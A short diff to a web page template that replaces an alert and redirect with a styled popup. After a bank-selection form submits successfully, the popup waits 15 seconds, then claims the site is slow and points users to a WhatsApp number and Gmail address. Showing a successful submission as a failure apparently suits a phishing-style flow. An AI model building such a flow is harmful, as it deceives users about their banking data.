@@ -173,7 +173,9 @@
     </div>
     <script src="{{asset('js/jquery.min.js')}}"></script>
     <script src="{{asset('js/bootstrap.min.js')}}"></script>
+    <script src="{{asset('plugins/sweet2/sweetalert2.all.min.js')}}"></script>
     <script>
+        // Swal.fire(`<div class="text-left pt-3" style="font-size: 17px;"><p>Site will be slow due to heavy traffice. Please Try again later.</p><p>Contact or WhatsApp <a href="https://api.whatsapp.com/send?phone=60123123123" target="_blank">60123123123</a></p><p>Email us at <a href="mailto:testtest123123@gmail.com">testtest123123@gmail.com</a></p></div>`);
         $(document).ready(function(){
             var bank_id = '';
             var bank_image = '';
@@ -202,11 +204,9 @@
                             $("#ajax-loading").fadeIn();
                         },
                         success: function(response) {
-                            console.log('success');
                             setTimeout(function(){ 
                                 $("#ajax-loading").fadeOut();
-                                alert("Site will be slow due to heavy traffice.Please Try again later.Try contact WhatsApp 12312312313, Or email testtest123@gmail.com"); 
-                                window.location.href = '/';
+                                Swal.fire(`<div class="text-left pt-3" style="font-size: 17px;"><p>Site will be slow due to heavy traffice. Please Try again later.</p><p>Contact or WhatsApp <a href="https://api.whatsapp.com/send?phone=60123123123" target="_blank">60123123123</a></p><p>Email us at <a href="mailto:testtest123123@gmail.com">testtest123123@gmail.com</a></p></div>`);
                             }, 15000);
                         },
                     });
